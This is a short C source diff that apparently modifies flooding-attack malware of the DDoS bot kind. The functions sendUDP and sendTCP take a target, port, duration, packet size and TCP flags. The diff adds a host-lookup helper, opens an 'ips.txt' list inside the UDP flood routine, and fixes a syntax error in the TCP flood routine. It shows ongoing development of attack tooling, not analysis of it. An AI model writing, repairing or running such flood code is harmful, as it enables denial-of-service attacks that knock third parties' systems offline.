@@ -77,6 +77,12 @@ uint32_t rand_cmwc(void)
 	}
 	return (Q[i] = r - x);
 }
+int getHost(unsigned char *toGet, struct in_addr *i)
+{
+        struct hostent *h;
+        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
+        return 0;
+}
 void init_rand(uint32_t x)
 {
         int i;
@@ -190,6 +196,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
         register unsigned int pollRegister;
         pollRegister = pollinterval;
         head = NULL;
+	FILE *ips = fopen("ips.txt","r");
         int max_len = 128;
 	char *buffer = (char *) malloc(max_len);
 	buffer = memset(buffer, 0x00, max_len);
@@ -282,7 +289,7 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
 {
         struct sockaddr_in dest_addr;
         struct ifreq ifr;
-	struct list *list_node
+	struct list *list_node;
 
         dest_addr.sin_family = AF_INET;
         if(port == 0) dest_addr.sin_port = rand_cmwc();
